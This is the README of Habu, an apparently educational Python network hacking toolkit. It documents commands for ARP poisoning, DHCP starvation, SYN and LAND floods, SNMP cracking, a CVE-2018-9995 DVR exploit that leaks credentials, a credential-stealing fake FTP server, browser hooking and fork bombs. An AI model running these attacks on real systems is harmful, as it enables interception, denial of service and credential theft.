
Habu: Python Network Hacking Toolkit
====================================


.. image:: logo.jpeg
   :target: logo.jpeg
   :alt: image


I'm developing Habu to teach (and learn) some concepts about Python and
Network Hacking.

These are basic functions that help with some tasks for Ethical Hacking
and Penetration Testing.

Most of them are related with networking, and the implementations are
intended to be understandable for who wants to read the source code and
learn from that.

Some techniques implemented in the current version are:


* ARP Poisoning
* ARP Sniffing
* DHCP Discover
* DHCP Starvation
* Fake FTP Server
* LAND Attack
* SNMP Cracking
* Subdomains Identification
* SSL/TLS Certificate Cloner
* SYN Flooding
* TCP Flags Analysis
* TCP ISN Analysis
* TCP Port Scan
* Username check on social networks
* Virtual Hosts Identification
* Web Techonologies Identification

Usage Videos
------------

The following Youtube Playlist has videos that shows the installation
and usage:

https://www.youtube.com/watch?v=rgp9seLLyqE&list=PL4HZnX8VnFXqSvNw7x-bXOn0dgxNdfnVD

Telegram Group
--------------

If you want to discuss some Habu features, possible improvements, etc,
you can use the Habu Telegram Group: https://t.me/python_habu

Issues and pull requests must be sent to github repo:
https://github.com/portantier/habu

Installation
------------

**Kali Linux:**

You can install the package created for Kali Linux. See
https://github.com/portantier/habu/releases

**Python Package (PyPi):**

Habu is on PyPi, so you can install it directly with pip:

.. code-block::

   $ pip3 install habu

Dependencies
------------

Habu requires Python3 and the following packages:


* beautifulsoup4
* click
* cryptography
* dnspython
* lxml
* prompt_toolkit
* pygments
* regex
* requests
* requests-cache
* scapy-python3
* websockets
* matplotlib (Optional, only needed if you want to make some graphs)

Get Help
--------

All the commands implement the option '--help', that shows the help,
arguments, options, and default values.

Verbose Mode
------------

Almost all commands implement the verbose mode with the '-v' option.
This can give you some extra info about what habu is doing.

Commands Index
--------------


* `arp.ping <#habuarpping>`_
* `arp.poison <#habuarppoison>`_
* `arp.sniff <#habuarpsniff>`_
* `asydns <#habuasydns>`_
* `b64 <#habub64>`_
* `certclone <#habucertclone>`_
* `config.del <#habuconfigdel>`_
* `config <#habuconfig>`_
* `config.set <#habuconfigset>`_
* `contest <#habucontest>`_
* `crack.luhn <#habucrackluhn>`_
* `crack.snmp <#habucracksnmp>`_
* `crtsh <#habucrtsh>`_
* `cve.2018.9995 <#habucve20189995>`_
* `cymon.ip <#habucymonip>`_
* `cymon.ip.timeline <#habucymoniptimeline>`_
* `dhcp.discover <#habudhcpdiscover>`_
* `dhcp.starvation <#habudhcpstarvation>`_
* `eicar <#habueicar>`_
* `extract.email <#habuextractemail>`_
* `extract.hostname <#habuextracthostname>`_
* `extract.ipv4 <#habuextractipv4>`_
* `fernet.genkey <#habufernetgenkey>`_
* `fernet <#habufernet>`_
* `forkbomb <#habuforkbomb>`_
* `gateway.find <#habugatewayfind>`_
* `hasher <#habuhasher>`_
* `ip2asn <#habuip2asn>`_
* `ip <#habuip>`_
* `isn <#habuisn>`_
* `jshell <#habujshell>`_
* `karma.bulk <#habukarmabulk>`_
* `karma <#habukarma>`_
* `land <#habuland>`_
* `nc <#habunc>`_
* `nmap.open <#habunmapopen>`_
* `nmap.ports <#habunmapports>`_
* `ping <#habuping>`_
* `protoscan <#habuprotoscan>`_
* `server.ftp <#habuserverftp>`_
* `shodan.open <#habushodanopen>`_
* `shodan <#habushodan>`_
* `synflood <#habusynflood>`_
* `tcpflags <#habutcpflags>`_
* `tcpscan <#habutcpscan>`_
* `traceroute <#habutraceroute>`_
* `usercheck <#habuusercheck>`_
* `vhosts <#habuvhosts>`_
* `virustotal <#habuvirustotal>`_
* `webid <#habuwebid>`_
* `web.report <#habuwebreport>`_
* `web.screenshot <#habuwebscreenshot>`_
* `whois.domain <#habuwhoisdomain>`_
* `whois.ip <#habuwhoisip>`_
* `xor <#habuxor>`_

habu.arp.ping
-------------

.. code-block::

   Usage: habu.arp.ping [OPTIONS] IP

     Send ARP packets to check if a host it's alive in the local network.

     Example:

     # habu.arping 192.168.0.1
     Ether / ARP is at a4:08:f5:19:17:a4 says 192.168.0.1 / Padding

   Options:
     -i TEXT  Interface to use
     -v       Verbose output
     --help   Show this message and exit.

habu.arp.poison
---------------

.. code-block::

   Usage: habu.arp.poison [OPTIONS] VICTIM1 VICTIM2

     Send ARP 'is-at' packets to each victim, poisoning their ARP tables for
     send the traffic to your system.

     Note: If you want a full working Man In The Middle attack, you need to
     enable the packet forwarding on your operating system to act like a
     router. You can do that using:

     # echo 1 > /proc/sys/net/ipv4/ip_forward

     Example:

     # habu.arpoison 192.168.0.1 192.168.0.77
     Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
     Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.70
     Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
     ...

   Options:
     -i TEXT  Interface to use
     -v       Verbose
     --help   Show this message and exit.

habu.arp.sniff
--------------

.. code-block::

   Usage: habu.arp.sniff [OPTIONS]

     Listen for ARP packets and show information for each device.

     Columns: Seconds from last packet | IP | MAC | Vendor

     Example:

     1   192.168.0.1     a4:08:f5:19:17:a4   Sagemcom Broadband SAS
     7   192.168.0.2     64:bc:0c:33:e5:57   LG Electronics (Mobile Communications)
     2   192.168.0.5     00:c2:c6:30:2c:58   Intel Corporate
     6   192.168.0.7     54:f2:01:db:35:58   Samsung Electronics Co.,Ltd

   Options:
     -i TEXT  Interface to use
     --help   Show this message and exit.

habu.asydns
-----------

.. code-block::

   Usage: habu.asydns [OPTIONS]

     Requests a DNS domain name based on public and private RSA keys using the
     AsyDNS protocol https://github.com/portantier/asydns

     Example:

     $ habu.asydns -v
     Generating RSA key ...
     Loading RSA key ...
     {
         "ip": "181.31.41.231",
         "name": "07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org"
     }

     $ dig +short 07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org
     181.31.41.231

   Options:
     -u TEXT  API URL
     -g       Force the generation of a new key pair
     -r       Revoke the public key
     -v       Verbose output
     --help   Show this message and exit.

habu.b64
--------

.. code-block::

   Usage: habu.b64 [OPTIONS] [F]

     Encodes or decode data in base64, just like the command base64.

     $ echo awesome | habu.b64
     YXdlc29tZQo=

     $ echo YXdlc29tZQo= | habu.b64 -d
     awesome

   Options:
     -d      decode instead of encode
     --help  Show this message and exit.

habu.certclone
--------------

.. code-block::

   Usage: habu.certclone [OPTIONS] HOSTNAME PORT KEYFILE CERTFILE

     Connect to an SSL/TLS server, get the certificate and generate a
     certificate with the same options and field values.

     Note: The generated certificate is invalid, but can be used for social
     engineering attacks

     Example:

     $ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem

   Options:
     --copy-extensions  Copy certificate extensions (default: False)
     --expired          Generate an expired certificate (default: False)
     -v                 Verbose
     --help             Show this message and exit.

habu.config.del
---------------

.. code-block::

   Usage: habu.config.del [OPTIONS] KEY

     Delete a KEY from the configuration.

     Note: By default, KEY is converted to uppercase.

     Example:

     $ habu.config.del DNS_SERVER

   Options:
     --help  Show this message and exit.

habu.config
-----------

.. code-block::

   Usage: habu.config [OPTIONS]

     Show the current config.

     Note: By default, the options with 'KEY' in their name are shadowed.

     Example:

     $ habu.config
     {
         "DNS_SERVER": "8.8.8.8",
         "FERNET_KEY": "*************"
     }

   Options:
     --show-keys       Show also the key values
     --option TEXT...  Write to the config(KEY VALUE)
     --help            Show this message and exit.

habu.config.set
---------------

.. code-block::

   Usage: habu.config.set [OPTIONS] KEY VALUE

     Set VALUE to the config KEY.

     Note: By default, KEY is converted to uppercase.

     Example:

     $ habu.config.set DNS_SERVER 8.8.8.8

   Options:
     --help  Show this message and exit.

habu.contest
------------

.. code-block::

   Usage: habu.contest [OPTIONS]

     Try to connect to various services and check if can reach them using your
     internet connection.

     Example:

     $ habu.contest
     IP:    True
     DNS:   True
     FTP:   True
     SSH:   True
     HTTP:  True
     HTTPS: True

   Options:
     --help  Show this message and exit.

habu.crack.luhn
---------------

.. code-block::

   Usage: habu.crack.luhn [OPTIONS] NUMBER

     Having known values for a Luhn validated number, obtain the possible
     unknown numbers.

     Numbers that use the Luhn algorithm for validation are Credit Cards, IMEI,
     National Provider Identifier in the United States, Canadian Social
     Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers
     (ΑΜΚΑ).

     The '-' characters are ignored.

     Define the missing numbers with the 'x' character.

     Reference: https://en.wikipedia.org/wiki/Luhn_algorithm

     Example:

     $ habu.crack.luhn 4509-xxxx-3160-6445

   Options:
     --help  Show this message and exit.

habu.crack.snmp
---------------

.. code-block::

   Usage: habu.crack.snmp [OPTIONS] IP

     Launches snmp-get queries against an IP, and tells you when finds a valid
     community string (is a simple SNMP cracker).

     The dictionary used is the distributed with the onesixtyone tool
     https://github.com/trailofbits/onesixtyone

     Example:

     # habu.crack.snmp 179.125.234.210
     Community found: private
     Community found: public

     Note: You can also receive messages like \<UNIVERSAL\> \<class
     'scapy.asn1.asn1.ASN1\_Class\_metaclass'\>, I don't know how to supress
     them for now.

   Options:
     -p INTEGER  Port to use
     -s          Stop after first match
     -v          Verbose
     --help      Show this message and exit.

habu.crtsh
----------

.. code-block::

   Usage: habu.crtsh [OPTIONS] DOMAIN

     Downloads the certificate transparency logs for a domain and check with
     DNS queries if each subdomain exists.

     Uses multithreading to improve the performance of the DNS queries.

     Example:

     $ sudo habu.crtsh securetia.com
     [
         "karma.securetia.com.",
         "www.securetia.com."
     ]

   Options:
     -c      Disable cache
     -n      Disable DNS subdomain validation
     -v      Verbose output
     --help  Show this message and exit.

habu.cve.2018.9995
------------------

.. code-block::

   Usage: habu.cve.2018.9995 [OPTIONS] IP

     Exploit the CVE-2018-9995 vulnerability, present on various DVR systems.

     Note: Based on the original code from Ezequiel Fernandez (@capitan_alfa).

     Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995

     Example:

     $ python habu.cve.2018-9995 82.202.102.42
     [
         {
             "uid": "admin",
             "pwd": "securepassword",
             "role": 2,
             "enmac": 0,
             "mac": "00:00:00:00:00:00",
             "playback": 4294967295,
             "view": 4294967295,
             "rview": 4294967295,
             "ptz": 4294967295,
             "backup": 4294967295,
             "opt": 4294967295
         }
     ]

   Options:
     -p INTEGER  Port to use (default: 80)
     -v          Verbose
     --help      Show this message and exit.

habu.cymon.ip
-------------

.. code-block::

   Usage: habu.cymon.ip [OPTIONS] IP

     Simple cymon API client.

     Prints the JSON result of a cymon IP query.

     Example:

     $ habu.cymon.ip 8.8.8.8
     {
         "addr": "8.8.8.8",
         "created": "2015-03-23T12:03:42Z",
         "updated": "2018-08-24T04:06:07Z",
         "sources": [
             "safeweb.norton.com",
             "botscout.com",
             "virustotal.com",
             "phishtank"
         ],
         "events": "https://www.cymon.io/api/nexus/v1/ip/8.8.8.8/events",
         "domains": "https://www.cymon.io/api/nexus/v1/ip/8.8.8.8/domains",
         "urls": "https://www.cymon.io/api/nexus/v1/ip/8.8.8.8/urls"
     }

   Options:
     -c           Disable cache
     -v           Verbose output
     -o FILENAME  Output file (default: stdout)
     --help       Show this message and exit.

habu.cymon.ip.timeline
----------------------

.. code-block::

   Usage: habu.cymon.ip.timeline [OPTIONS] IP

     Simple cymon API client.

     Prints the JSON result of a cymon IP timeline query.

     Example:

     $ habu.cymon.ip.timeline 8.8.8.8
     {
         "timeline": [
             {
                 "time_label": "Aug. 18, 2018",
                 "events": [
                     {
                         "description": "Posted: 2018-08-18 23:37:39 CEST IDS Alerts: 0 URLQuery Alerts: 1 ...",
                         "created": "2018-08-18T21:39:07Z",
                         "title": "Malicious activity reported by urlquery.net",
                         "details_url": "http://urlquery.net/report/b1393866-9b1f-4a8e-b02b-9636989050f3",
                         "tag": "malicious activity"
                     }
                 ]
             },
             ...

   Options:
     -c           Disable cache
     -v           Verbose output
     -o FILENAME  Output file (default: stdout)
     -p           Pretty output
     --help       Show this message and exit.

habu.dhcp.discover
------------------

.. code-block::

   Usage: habu.dhcp.discover [OPTIONS]

     Send a DHCP request and show what devices has replied.

     Note: Using '-v' you can see all the options (like DNS servers) included
     on the responses.

     # habu.dhcp_discover
     Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP

   Options:
     -i TEXT     Interface to use
     -t INTEGER  Time (seconds) to wait for responses
     -v          Verbose output
     --help      Show this message and exit.

habu.dhcp.starvation
--------------------

.. code-block::

   Usage: habu.dhcp.starvation [OPTIONS]

     Send multiple DHCP requests from forged MAC addresses to fill the DHCP
     server leases.

     When all the available network addresses are assigned, the DHCP server
     don't send responses.

     So, some attacks, like DHCP spoofing, can be made.

     # habu.dhcp_starvation
     Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
     Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
     Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP

   Options:
     -i TEXT     Interface to use
     -t INTEGER  Time (seconds) to wait for responses
     -s INTEGER  Time (seconds) between requests
     -v          Verbose output
     --help      Show this message and exit.

habu.eicar
----------

.. code-block::

   Usage: habu.eicar [OPTIONS]

     Print the EICAR test string that can be used to test antimalware engines.

     More info: http://www.eicar.org/86-0-Intended-use.html

     Example:

     $ habu.eicar
     X5O!P%@AP[4\XZP54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

   Options:
     --help  Show this message and exit.

habu.extract.email
------------------

.. code-block::

   Usage: habu.extract.email [OPTIONS] [INFILE]

     Extract email addresses from a file or stdin.

     Example:

     $ cat /var/log/auth.log | habu.extract.email
     john@securetia.com
     raven@acmecorp.net
     nmarks@fimax.com

   Options:
     -v      Verbose output
     -j      JSON output
     --help  Show this message and exit.

habu.extract.hostname
---------------------

.. code-block::

   Usage: habu.extract.hostname [OPTIONS] [INFILE]

     Extract hostnames from a file or stdin.

     Example:

     $ cat /var/log/some.log | habu.extract.hostname
     www.google.com
     ibm.com
     fileserver.redhat.com

   Options:
     -c      Check if hostname resolves
     -v      Verbose output
     -j      JSON output
     --help  Show this message and exit.

habu.extract.ipv4
-----------------

.. code-block::

   Usage: habu.extract.ipv4 [OPTIONS] [INFILE]

     Extract IPv4 addresses from a file or stdin.

     Example:

     $ cat /var/log/auth.log | habu.extract.ipv4
     172.217.162.4
     23.52.213.96
     190.210.43.70

   Options:
     --json  JSON output
     -v      Verbose output
     --help  Show this message and exit.

habu.fernet.genkey
------------------

.. code-block::

   Usage: habu.fernet.genkey [OPTIONS]

     Generate a new Fernet Key, optionally write it to ~/.habu.json

     Example:

     $ habu.fernet.genkey
     xgvWCIvjwe9Uq7NBvwO796iI4dsGD623QOT9GWqnuhg=

   Options:
     -w      Write this key to ~/.habu.json
     --help  Show this message and exit.

habu.fernet
-----------

.. code-block::

   Usage: habu.fernet [OPTIONS]

     Fernet cipher.

     Uses AES-128-CBC with HMAC

     Note: You must use a key to cipher with Fernet.

     Use the -k paramenter or set the FERNET_KEY configuration value.

     The keys can be generated with the command habu.fernet.genkey

     Reference: https://github.com/fernet/spec/blob/master/Spec.md

     Example:

     $ "I want to protect this string" | habu.fernet
     gAAAAABbXnCGoCULLuVNRElYTbEcwnek9iq5jBKq9JAN3wiiBUzPqpUgV5oWvnC6xfIA...

     $ echo gAAAAABbXnCGoCULLuVNRElYTbEcwnek9iq5jBKq9JAN3wiiBUzPqpUgV5oWvnC6xfIA... | habu.fernet -d
     I want to protect this string

   Options:
     -k TEXT        Key
     -d             Decrypt instead of encrypt
     --ttl INTEGER  Time To Live for timestamp verification
     -i FILENAME    Input file (default: stdin)
     -o FILENAME    Output file (default: stdout)
     --help         Show this message and exit.

habu.forkbomb
-------------

.. code-block::

   Usage: habu.forkbomb [OPTIONS] [bash|batch|c|haskell|perl|php|python|ruby]

     A shortcut to remember how to use fork bombs in different languages.

     Currently supported: bash, batch, c, haskell, perl, php, python, ruby.

     Example:

     $ habu.forkbomb c
     #include <unistd.h>
     int main()
     {
         while(1)
         {
             fork();
         }
         return 0;
     }

   Options:
     --help  Show this message and exit.

habu.gateway.find
-----------------

.. code-block::

   Usage: habu.gateway.find [OPTIONS] NETWORK

     Try to reach an external IP using any host has a router.

     Useful to find routers in your network.

     First, uses arping to detect alive hosts and obtain MAC addresses.

     Later, create a network packet and put each MAC address as destination.

     Last, print the devices that forwarded correctly the packets.

     Example:

     # habu.find.gateway 192.168.0.0/24
     192.168.0.1 a4:08:f5:19:17:a4 Sagemcom
     192.168.0.7 b0:98:2b:5d:22:70 Sagemcom
     192.168.0.8 b0:98:2b:5d:1f:e8 Sagemcom

   Options:
     -i TEXT                Interface to use
     --host TEXT            Host to reach (default: 8.8.8.8)
     --tcp                  Use TCP instead of ICMP
     --dport INTEGER RANGE  Destination port for TCP (default: 80)
     --timeout INTEGER      Timeout in seconds (default: 5)
     -v                     Verbose output
     --help                 Show this message and exit.

habu.hasher
-----------

.. code-block::

   Usage: habu.hasher [OPTIONS] [F]

     Computes various hashes for the input data, that can be a file or a
     stream.

     Example:

     $ habu.hasher README.rst
     md5          e5828c564f71fea3a12dde8bd5d27063 README.rst
     ripemd160    ef6886c3b68cb34a44f9ca9336f3cd0732600a84 README.rst
     sha1         7bae8076a5771865123be7112468b79e9d78a640 README.rst
     sha512       65cfb1cf719b851b4aea5a7f5388068687b1fdfd290817a... README.rst
     whirlpool    eaccf718b31d8a01f76fc08e896a6d0d73dbeafc2621fe0... README.rst

     You can also specify which algorithm to use. In such case, the output is
     only the value of the calculated hash:

     $ habu.hasher -a md5 README.rst
     e5828c564f71fea3a12dde8bd5d27063 README.rst

   Options:
     -a [md5|sha1|sha256|sha512|ripemd160|whirlpool]
                                     Only this algorithm (Default: all)
     --help                          Show this message and exit.

habu.ip2asn
-----------

.. code-block::

   Usage: habu.ip2asn [OPTIONS] IP

     Use Team Cymru ip2asn service to get information about a public IPv4/IPv6.

     Reference: https://www.team-cymru.com/IP-ASN-mapping.html

     $ habu.ip2asn 8.8.8.8
     {
         "asn": "15169",
         "net": "8.8.8.0/24",
         "cc": "US",
         "rir": "ARIN",
         "asname": "GOOGLE - Google LLC, US",
         "country": "United States"
     }

   Options:
     --help  Show this message and exit.

habu.ip
-------

.. code-block::

   Usage: habu.ip [OPTIONS]

     Print your current public IP based on the response from
     https://api.ipify.org

     Example:

     $ habu.ip
     182.26.32.246

   Options:
     --help  Show this message and exit.

habu.isn
--------

.. code-block::

   Usage: habu.isn [OPTIONS] IP

     Create TCP connections and print the TCP initial sequence numbers for each
     one.

     $ sudo habu.isn -c 5 www.portantier.com
     1962287220
     1800895007
     589617930
     3393793979
     469428558

     Note: You can get a graphical representation (needs the matplotlib
     package) using the '-g' option to better understand the randomness.

   Options:
     -p INTEGER  Port to use (default: 80)
     -c INTEGER  How many packets to send/receive (default: 5)
     -i TEXT     Interface to use
     -g          Graph (requires matplotlib)
     -v          Verbose output
     --help      Show this message and exit.

habu.jshell
-----------

.. code-block::

   Usage: habu.jshell [OPTIONS]

     Control a web browser through Websockets.

     Bind a port (default: 3333) and listen for HTTP connections.

     On connection, send a JavaScript code that opens a WebSocket that can be
     used to send commands to the connected browser.

     You can write the commands directly in the shell, or use plugins, that are
     simply external JavaScript files.

     Using habu.jshell you can completely control a web browser.

     Reference: https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API

     Example:

     $ habu.jshell
     >> Listening on 192.168.0.10:3333. Waiting for a victim connection.
     >> HTTP Request received from 192.168.0.15. Sending hookjs
     >> Connection from 192.168.0.15
     $ _sessions
     0 * 192.168.0.15:33432 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
     $ _info
     {
         "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
         "location": "http://192.168.0.10:3333/",
         "java-enabled": false,
         "platform": "Linux x86_64",
         "app-code-name": "Mozilla",
         "app-name": "Netscape",
         "app-version": "5.0 (X11)",
         "cookie-enabled": true,
         "language": "es-AR",
         "online": true
     }
     $ document.location
     http://192.168.0.10:3333/

   Options:
     -v          Verbose
     -i TEXT     IP to listen on
     -p INTEGER  Port to listen on
     --help      Show this message and exit.

habu.karma.bulk
---------------

.. code-block::

   Usage: habu.karma.bulk [OPTIONS] [INFILE]

     Show which IP addresses are inside blacklists using the Karma online
     service.

     Example:

     $ cat /var/log/auth.log | habu.extract.ipv4 | habu.karma.bulk
     172.217.162.4   spamhaus_drop,alienvault_spamming
     23.52.213.96    CLEAN
     190.210.43.70   alienvault_malicious

   Options:
     --json  JSON output
     --bad   Show only entries in blacklists
     -v      Verbose output
     --help  Show this message and exit.

habu.karma
----------

.. code-block::

   Usage: habu.karma [OPTIONS] HOST

     Use the Karma service https://karma.securetia.com to check an IP against
     various Threat Intelligence / Reputation lists.

     $ habu.karma www.google.com
     www.google.com -> 64.233.190.99
     [
         "hphosts_fsa",
         "hphosts_psh",
         "hphosts_emd"
     ]

     Note: You can use the hostname or the IP of the host to query.

   Options:
     --help  Show this message and exit.

habu.land
---------

.. code-block::

   Usage: habu.land [OPTIONS] IP

     This command implements the LAND attack, that sends packets forging the
     source IP address to be the same that the destination IP. Also uses the
     same source and destination port.

     The attack is very old, and can be used to make a Denial of Service on old
     systems, like Windows NT 4.0. More information here:
     https://en.wikipedia.org/wiki/LAND

     # sudo habu.land 172.16.0.10
     ............

     Note: Each dot (.) is a sent packet. You can specify how many packets send
     with the '-c' option. The default is never stop. Also, you can specify the
     destination port, with the '-p' option.

   Options:
     -c INTEGER  How many packets send (default: infinit)
     -p INTEGER  Port to use (default: 135)
     -i TEXT     Interface to use
     -v          Verbose
     --help      Show this message and exit.

habu.nc
-------

.. code-block::

   Usage: habu.nc [OPTIONS] HOST PORT

     Some kind of netcat/ncat replacement.

     The execution emulates the feeling of this popular tools.

     Example:

     $ habu.nc --crlf www.portantier.com 80
     Connected to 45.77.113.133 80
     HEAD / HTTP/1.0

     HTTP/1.0 301 Moved Permanently
     Date: Thu, 26 Jul 2018 21:10:51 GMT
     Server: OpenBSD httpd
     Connection: close
     Content-Type: text/html
     Content-Length: 443
     Location: https://www.portantier.com/

   Options:
     --family [4|6|46]            IP Address Family
     --ssl                        Enable SSL
     --crlf                       Use CRLF for EOL sequence
     --protocol [tcp|udp]         Layer 4 protocol to use
     --source-ip TEXT             Source IP to use
     --source-port INTEGER RANGE  Source port to use
     --help                       Show this message and exit.

habu.nmap.open
--------------

.. code-block::

   Usage: habu.nmap.open [OPTIONS] SCANFILE

     Read an nmap report and print the open ports.

     Print the ports that has been resulted open reading the generated nmap
     output.

     You can use it to rapidly reutilize the port list for the input of other
     tools.

     Supports and detects the 3 output formats (nmap, gnmap and xml)

     Example:

     # habu.nmap.open portantier.nmap
     22,80,443

   Options:
     -p [tcp|udp|sctp]  The protocol (default=tcp)
     --help             Show this message and exit.

habu.nmap.ports
---------------

.. code-block::

   Usage: habu.nmap.ports [OPTIONS] SCANFILE

     Read an nmap report and print the tested ports.

     Print the ports that has been tested reading the generated nmap output.

     You can use it to rapidly reutilize the port list for the input of other
     tools.

     Supports and detects the 3 output formats (nmap, gnmap and xml)

     Example:

     # habu.nmap.ports portantier.nmap
     21,22,23,80,443

   Options:
     -p [tcp|udp|sctp]  The protocol (default=tcp)
     --help             Show this message and exit.

habu.ping
---------

.. code-block::

   Usage: habu.ping [OPTIONS] IP

     The classic ping tool that send ICMP echo requests.

     # habu.ping 8.8.8.8
     IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
     IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
     IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
     IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding

   Options:
     -i TEXT     Wich interface to use (default: auto)
     -c INTEGER  How many packets send (default: infinit)
     -t INTEGER  Timeout in seconds (default: 2)
     -w INTEGER  How many seconds between packets (default: 1)
     -v          Verbose
     --help      Show this message and exit.

habu.protoscan
--------------

.. code-block::

   Usage: habu.protoscan [OPTIONS] IP

     Send IP packets with different protocol field content to guess what layer
     4 protocols are available.

     The output shows which protocols doesn't generate a 'protocol-unreachable'
     ICMP response.

     Example:

     $ sudo python cmd_ipscan.py 45.77.113.133
     1   icmp
     2   igmp
     4   ipencap
     6   tcp
     17  udp
     41  ipv6
     47  gre
     50  esp
     51  ah
     58  ipv6_icmp
     97  etherip
     112 vrrp
     115 l2tp
     132 sctp
     137 mpls_in_ip

   Options:
     -i TEXT     Interface to use
     -t INTEGER  Timeout for each probe (default: 2 seconds)
     --all       Probe all protocols (default: Defined in /etc/protocols)
     -v          Verbose output
     --help      Show this message and exit.

habu.server.ftp
---------------

.. code-block::

   Usage: habu.server.ftp [OPTIONS]

     Basic fake FTP server, whith the only purpose to steal user credentials.

     Supports SSL/TLS.

     Example:

     # sudo habu.server.ftp --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem
     Listening on port 21
     Accepted connection from ('192.168.0.27', 56832)
     Credentials collected from 192.168.0.27! fabian 123456

   Options:
     -a TEXT          Address to bind (default: all)
     -p INTEGER       Which port to use (default: 21)
     --ssl            Enable SSL/TLS (default: False)
     --ssl-cert TEXT  SSL/TLS Cert file
     --ssl-key TEXT   SSL/TLS Key file
     -v               Verbose
     --help           Show this message and exit.

habu.shodan.open
----------------

.. code-block::

   Usage: habu.shodan.open [OPTIONS] IP

     Output the open ports for an IP against shodan (nmap format).

     Example:

     $ habu.shodan.open 8.8.8.8
     T:53,U:53

   Options:
     -c           Disable cache
     -j           Output in JSON format
     -x           Output an nmap command to scan open ports
     -v           Verbose output
     -o FILENAME  Output file (default: stdout)
     --help       Show this message and exit.

habu.shodan
-----------

.. code-block::

   Usage: habu.shodan [OPTIONS] IP

     Simple shodan API client.

     Prints the JSON result of a shodan query.

     Example:

     $ habu.shodan 8.8.8.8
     {
         "hostnames": [
             "google-public-dns-a.google.com"
         ],
         "country_code": "US",
         "org": "Google",
         "data": [
             {
                 "isp": "Google",
                 "transport": "udp",
                 "data": "Recursion: enabled",
                 "asn": "AS15169",
                 "port": 53,
                 "hostnames": [
                     "google-public-dns-a.google.com"
                 ]
             }
         ],
         "ports": [
             53
         ]
     }

   Options:
     -c           Disable cache
     -v           Verbose output
     -o FILENAME  Output file (default: stdout)
     --help       Show this message and exit.

habu.synflood
-------------

.. code-block::

   Usage: habu.synflood [OPTIONS] IP

     Launch a lot of TCP connections and keeps them opened.

     Some very old systems can suffer a Denial of Service with this.

     Reference: https://en.wikipedia.org/wiki/SYN_flood

     Example:

     # sudo habu.synflood 172.16.0.10
     .................

     Each dot is a packet sent.

     You can use the options '-2' and '-3' to forge the layer 2/3 addresses.

     If you use them, each connection will be sent from a random layer2 (MAC)
     and/or layer3 (IP) address.

     You can choose the number of connections to create with the option '-c'.
     The default is never stop creating connections.

     Note: If you send the packets from your real IP address and you want to
     keep the connections half-open, you need to setup for firewall to don't
     send the RST packets.

   Options:
     -i TEXT     Wich interface to use (default: auto)
     -c INTEGER  How many packets send (default: infinit)
     -p INTEGER  Port to use (default: 135)
     -2          Forge layer2/MAC address (default: No)
     -3          Forge layer3/IP address (default: No)
     -v          Verbose
     --help      Show this message and exit.

habu.tcpflags
-------------

.. code-block::

   Usage: habu.tcpflags [OPTIONS] IP

     Send TCP packets with different flags and tell what responses receives.

     It can be used to analyze how the different TCP/IP stack implementations
     and configurations responds to packet with various flag combinations.

     Example:

     # habu.tcpflags www.portantier.com
     S  -> SA
     FS -> SA
     FA -> R
     SA -> R

     By default, the command sends all possible flag combinations. You can
     specify which flags must ever be present (reducing the quantity of
     possible combinations), with the option '-f'.

     Also, you can specify which flags you want to be present on the response
     packets to show, with the option '-r'.

     With the next command, you see all the possible combinations that have the
     FIN (F) flag set and generates a response that contains the RST (R) flag.

     Example:

     # habu.tcpflags -f F -r R www.portantier.com
     FPA  -> R
     FSPA -> R
     FAU  -> R

   Options:
     -p INTEGER  Port to use (default: 80)
     -f TEXT     Flags that must be sent ever (default: fuzz with all flags)
     -r TEXT     Filter by response flags (default: show all responses)
     -v          Verbose
     --help      Show this message and exit.

habu.tcpscan
------------

.. code-block::

   Usage: habu.tcpscan [OPTIONS] IP

     TCP Port Scanner.

     Print the ports that generated a response with the SYN flag or (if show
     use -a) all the ports that generated a response.

     It's really basic compared with nmap, but who is comparing?

     Example:

     # habu.tcpscan -p 22,23,80,443 -s 1 45.77.113.133
     22 S -> SA
     80 S -> SA
     443 S -> SA

   Options:
     -p TEXT     Ports to use (default: 80) example: 20-23,80,135
     -i TEXT     Interface to use
     -f TEXT     Flags to use (default: S)
     -s TEXT     Time between probes (default: send all together)
     -t INTEGER  Timeout for each probe (default: 2 seconds)
     -a          Show all responses (default: Only containing SYN flag)
     -v          Verbose output
     --help      Show this message and exit.

habu.traceroute
---------------

.. code-block::

   Usage: habu.traceroute [OPTIONS] IP

     TCP traceroute.

     Identify the path to a destination getting the ttl-zero-during-transit
     messages.

     Note: On the internet, you can have various valid paths to a device.

     Example:

     # habu.traceroute 45.77.113.133
     IP / ICMP 192.168.0.1 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
     IP / ICMP 10.242.4.197 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
     IP / ICMP 200.32.127.98 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
     .
     IP / ICMP 4.16.180.190 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
     .
     IP / TCP 45.77.113.133:http > 192.168.0.5:ftp_data SA / Padding

     Note: It's better if you use a port that is open on the remote system.

   Options:
     -p INTEGER  Port to use (default: 80)
     -i TEXT     Interface to use
